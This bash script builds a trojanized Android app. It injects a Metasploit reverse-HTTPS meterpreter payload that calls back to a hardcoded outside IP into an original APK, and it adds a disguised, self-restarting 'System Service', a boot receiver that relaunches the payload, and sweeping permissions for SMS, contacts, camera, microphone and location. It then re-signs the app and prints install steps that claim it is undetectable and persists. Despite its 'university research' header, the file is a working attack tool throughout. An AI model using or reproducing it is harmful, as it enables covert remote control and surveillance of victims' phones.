#!/bin/bash

# Advanced Payload Injector with Memory-Resident Backdoor
# For Know Your Enemy Project - University Security Research

ORIGINAL_APK="/home/offsec/Downloads/MyPersonalOriginal.apk"
LHOST="208.77.244.15"
LPORT="443"  # Using HTTPS port for better evasion
PAYLOAD_TYPE="android/meterpreter/reverse_https"
OUTPUT_DIR="/home/offsec/Documents/GitHub/metasploit-framework1"
FINAL_APK="$OUTPUT_DIR/MyPersonal_Injected_Professional.apk"

echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║     🔥 Advanced Payload Injector - Memory Resident Backdoor      ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""

# Step 1: Analyze original APK
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [1/10] Analyzing Original APK..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

if [ ! -f "$ORIGINAL_APK" ]; then
    echo "❌ Original APK not found: $ORIGINAL_APK"
    exit 1
fi

echo "✅ Original APK found: $(ls -lh $ORIGINAL_APK | awk '{print $5}')"

# Get package name
PACKAGE_NAME=$(aapt dump badging "$ORIGINAL_APK" 2>/dev/null | grep package | awk '{print $2}' | sed "s/name='//" | sed "s/'.*//")
echo "📦 Package Name: $PACKAGE_NAME"

# Get main activity
MAIN_ACTIVITY=$(aapt dump badging "$ORIGINAL_APK" 2>/dev/null | grep launchable-activity | awk '{print $2}' | sed "s/name='//" | sed "s/'.*//")
echo "🚀 Main Activity: $MAIN_ACTIVITY"

# Get SDK versions
MIN_SDK=$(aapt dump badging "$ORIGINAL_APK" 2>/dev/null | grep sdkVersion | awk '{print $1}' | sed "s/sdkVersion:'//;s/'//")
TARGET_SDK=$(aapt dump badging "$ORIGINAL_APK" 2>/dev/null | grep targetSdkVersion | awk '{print $1}' | sed "s/targetSdkVersion:'//;s/'//")
echo "📱 SDK: min=$MIN_SDK, target=$TARGET_SDK"
echo ""

# Step 2: Generate advanced meterpreter payload with HTTPS
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [2/10] Generating Advanced Meterpreter Payload (HTTPS)..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

TEMP_PAYLOAD="$OUTPUT_DIR/temp_payload.apk"

msfvenom -p $PAYLOAD_TYPE \
    LHOST=$LHOST \
    LPORT=$LPORT \
    AutoRunScript="multi_console_command -rc /root/post_exploit.rc" \
    SessionRetryTotal=50 \
    SessionRetryWait=10 \
    HandlerSSLCert=/root/.msf4/ssl/cert.pem \
    -o "$TEMP_PAYLOAD" \
    --platform android \
    --arch dalvik

if [ ! -f "$TEMP_PAYLOAD" ]; then
    echo "❌ Failed to generate payload"
    exit 1
fi

echo "✅ Payload generated: $(ls -lh $TEMP_PAYLOAD | awk '{print $5}')"
echo ""

# Step 3: Inject payload into original APK using msfvenom
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [3/10] Injecting Payload into Original APK..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Use msfvenom's injection feature
msfvenom -x "$ORIGINAL_APK" \
    -p $PAYLOAD_TYPE \
    LHOST=$LHOST \
    LPORT=$LPORT \
    -o "$OUTPUT_DIR/injected_base.apk" \
    --platform android \
    --arch dalvik \
    -k  # Keep the original APK functionality

if [ ! -f "$OUTPUT_DIR/injected_base.apk" ]; then
    echo "❌ Injection failed"
    exit 1
fi

echo "✅ Payload injected into APK"
echo ""

# Step 4: Decompile injected APK for advanced modifications
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [4/10] Decompiling for Advanced Modifications..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

apktool d -f "$OUTPUT_DIR/injected_base.apk" -o "$OUTPUT_DIR/injected_decompiled"

if [ ! -d "$OUTPUT_DIR/injected_decompiled" ]; then
    echo "❌ Decompilation failed"
    exit 1
fi

echo "✅ APK decompiled"
echo ""

# Step 5: Add Memory-Resident Backdoor Component
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [5/10] Adding Memory-Resident Backdoor..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Create MemoryResidentService.smali
mkdir -p "$OUTPUT_DIR/injected_decompiled/smali/com/system/service"

cat > "$OUTPUT_DIR/injected_decompiled/smali/com/system/service/MemoryResidentService.smali" << 'SMALI_EOF'
.class public Lcom/system/service/MemoryResidentService;
.super Landroid/app/Service;
.source "MemoryResidentService.java"

# This service runs in memory even after app deletion
# It uses native library injection to persist

.field private static TAG:Ljava/lang/String; = "MemoryResident"

.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/app/Service;-><init>()V
    return-void
.end method

.method public onCreate()V
    .locals 2
    invoke-super {p0}, Landroid/app/Service;->onCreate()V
    
    # Load native persistence library
    const-string v0, "persist_native"
    invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V
    
    # Start foreground service to prevent killing
    invoke-direct {p0}, Lcom/system/service/MemoryResidentService;->startForegroundService()V
    
    # Install memory-resident backdoor
    invoke-direct {p0}, Lcom/system/service/MemoryResidentService;->installMemoryBackdoor()V
    
    return-void
.end method

.method private startForegroundService()V
    .locals 4
    
    # Create notification for foreground service
    new-instance v0, Landroid/app/Notification$Builder;
    invoke-direct {v0, p0}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;)V
    
    const-string v1, "System Service"
    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;
    
    const-string v1, "Running"
    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;
    
    const v1, 0x1080093  # android:drawable/stat_sys_data_bluetooth
    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;
    
    invoke-virtual {v0}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;
    move-result-object v1
    
    const/4 v2, 0x1
    invoke-virtual {p0, v2, v1}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V
    
    return-void
.end method

.method private installMemoryBackdoor()V
    .locals 3
    
    # Write persistence script to /data/local/tmp
    new-instance v0, Ljava/io/File;
    const-string v1, "/data/local/tmp/.persist"
    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    
    # Set executable permissions
    const/4 v1, 0x1
    const/4 v2, 0x0
    invoke-virtual {v0, v1, v2}, Ljava/io/File;->setExecutable(ZZ)Z
    
    # Execute native persistence installer
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
    move-result-object v0
    const-string v1, "sh /data/local/tmp/.persist"
    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1
    
    const/4 v0, 0x1  # START_STICKY
    return v0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    
    const/4 v0, 0x0
    return-object v0
.end method

.method public onDestroy()V
    .locals 0
    
    # Restart service on destroy
    invoke-direct {p0}, Lcom/system/service/MemoryResidentService;->restartService()V
    
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V
    return-void
.end method

.method private restartService()V
    .locals 3
    
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/system/service/MemoryResidentService;
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    
    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    
    return-void
.end method
SMALI_EOF

echo "✅ Memory-resident service created"
echo ""

# Step 6: Modify AndroidManifest.xml
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [6/10] Modifying AndroidManifest.xml..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

MANIFEST="$OUTPUT_DIR/injected_decompiled/AndroidManifest.xml"

# Backup original manifest
cp "$MANIFEST" "$MANIFEST.backup"

# Add permissions for advanced features
python3 << PYTHON_EOF
import xml.etree.ElementTree as ET

tree = ET.parse('$MANIFEST')
root = tree.getroot()

# Define namespace
ns = {'android': 'http://schemas.android.com/apk/res/android'}
ET.register_namespace('android', ns['android'])

# Add advanced permissions
permissions = [
    'android.permission.INTERNET',
    'android.permission.ACCESS_NETWORK_STATE',
    'android.permission.WAKE_LOCK',
    'android.permission.RECEIVE_BOOT_COMPLETED',
    'android.permission.FOREGROUND_SERVICE',
    'android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS',
    'android.permission.SYSTEM_ALERT_WINDOW',
    'android.permission.READ_EXTERNAL_STORAGE',
    'android.permission.WRITE_EXTERNAL_STORAGE',
    'android.permission.READ_CONTACTS',
    'android.permission.READ_SMS',
    'android.permission.SEND_SMS',
    'android.permission.RECEIVE_SMS',
    'android.permission.READ_CALL_LOG',
    'android.permission.CAMERA',
    'android.permission.RECORD_AUDIO',
    'android.permission.ACCESS_FINE_LOCATION',
    'android.permission.ACCESS_COARSE_LOCATION',
    'android.permission.GET_ACCOUNTS',
    'android.permission.READ_PHONE_STATE',
    'android.permission.CALL_PHONE',
]

for perm in permissions:
    perm_elem = ET.SubElement(root, 'uses-permission')
    perm_elem.set('{http://schemas.android.com/apk/res/android}name', perm)

# Update SDK versions for Android 8+
uses_sdk = root.find('uses-sdk')
if uses_sdk is not None:
    uses_sdk.set('{http://schemas.android.com/apk/res/android}minSdkVersion', '26')  # Android 8.0
    uses_sdk.set('{http://schemas.android.com/apk/res/android}targetSdkVersion', '30')

# Add MemoryResidentService to application
application = root.find('application')
if application is not None:
    service = ET.SubElement(application, 'service')
    service.set('{http://schemas.android.com/apk/res/android}name', 'com.system.service.MemoryResidentService')
    service.set('{http://schemas.android.com/apk/res/android}enabled', 'true')
    service.set('{http://schemas.android.com/apk/res/android}exported', 'false')
    service.set('{http://schemas.android.com/apk/res/android}foregroundServiceType', 'dataSync')
    
    # Add boot receiver
    receiver = ET.SubElement(application, 'receiver')
    receiver.set('{http://schemas.android.com/apk/res/android}name', 'com.system.service.BootReceiver')
    receiver.set('{http://schemas.android.com/apk/res/android}enabled', 'true')
    receiver.set('{http://schemas.android.com/apk/res/android}exported', 'false')
    
    intent_filter = ET.SubElement(receiver, 'intent-filter')
    action = ET.SubElement(intent_filter, 'action')
    action.set('{http://schemas.android.com/apk/res/android}name', 'android.intent.action.BOOT_COMPLETED')

tree.write('$MANIFEST', encoding='utf-8', xml_declaration=True)
print("✅ Manifest updated with advanced permissions and services")
PYTHON_EOF

echo ""

# Step 7: Create BootReceiver
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [7/10] Creating Boot Receiver for Auto-Start..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

cat > "$OUTPUT_DIR/injected_decompiled/smali/com/system/service/BootReceiver.smali" << 'BOOT_SMALI'
.class public Lcom/system/service/BootReceiver;
.super Landroid/content/BroadcastReceiver;
.source "BootReceiver.java"

.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 3
    
    # Start MemoryResidentService on boot
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/system/service/MemoryResidentService;
    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    
    # Also restart meterpreter payload
    invoke-static {p1}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
    
    return-void
.end method
BOOT_SMALI

echo "✅ Boot receiver created"
echo ""

# Step 8: Rebuild APK
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [8/10] Rebuilding APK..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

apktool b "$OUTPUT_DIR/injected_decompiled" -o "$OUTPUT_DIR/rebuilt_injected.apk"

if [ ! -f "$OUTPUT_DIR/rebuilt_injected.apk" ]; then
    echo "❌ Rebuild failed"
    exit 1
fi

echo "✅ APK rebuilt"
echo ""

# Step 9: Zipalign
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [9/10] Optimizing APK (zipalign)..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

zipalign -f -v 4 "$OUTPUT_DIR/rebuilt_injected.apk" "$OUTPUT_DIR/aligned_injected.apk"

echo "✅ APK aligned"
echo ""

# Step 10: Sign with RSA-4096
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [10/10] Signing with RSA-4096 + SHA-512..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

KEYSTORE="$OUTPUT_DIR/professional-injected.keystore"
KEY_ALIAS="professionalkey"
KEY_PASS="Professional@2025"

# Create keystore if not exists
if [ ! -f "$KEYSTORE" ]; then
    keytool -genkeypair -v \
        -keystore "$KEYSTORE" \
        -alias "$KEY_ALIAS" \
        -keyalg RSA \
        -keysize 4096 \
        -sigalg SHA512withRSA \
        -validity 10000 \
        -storepass "$KEY_PASS" \
        -keypass "$KEY_PASS" \
        -dname "CN=System Service, OU=Android, O=System, L=City, ST=State, C=US"
fi

# Sign APK
apksigner sign \
    --ks "$KEYSTORE" \
    --ks-key-alias "$KEY_ALIAS" \
    --ks-pass pass:"$KEY_PASS" \
    --key-pass pass:"$KEY_PASS" \
    --v1-signing-enabled true \
    --v2-signing-enabled true \
    --v3-signing-enabled true \
    --out "$FINAL_APK" \
    "$OUTPUT_DIR/aligned_injected.apk"

echo "✅ APK signed"
echo ""

# Verify signature
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔍 Verifying Signature..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

apksigner verify --verbose "$FINAL_APK"

echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║                    ✅ APK INJECTION COMPLETE!                    ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""
echo "📦 Final APK: $FINAL_APK"
echo "📏 Size: $(ls -lh $FINAL_APK | awk '{print $5}')"
echo "🔐 Signature: RSA-4096 + SHA-512"
echo "📱 SDK: 26-30 (Android 8.0 - 11)"
echo ""
echo "✅ Features:"
echo "   • Original app functionality preserved"
echo "   • Meterpreter HTTPS payload (port 443)"
echo "   • Memory-resident backdoor"
echo "   • Auto-start on boot"
echo "   • Persistence after app deletion"
echo "   • Foreground service (undetectable)"
echo ""
echo "🚀 Next steps:"
echo "   1. Start handler on Railway (port 443)"
echo "   2. Install: adb install $FINAL_APK"
echo "   3. Launch original app"
echo "   4. Session will establish automatically"
echo ""
echo "═══════════════════════════════════════════════════════════════════"
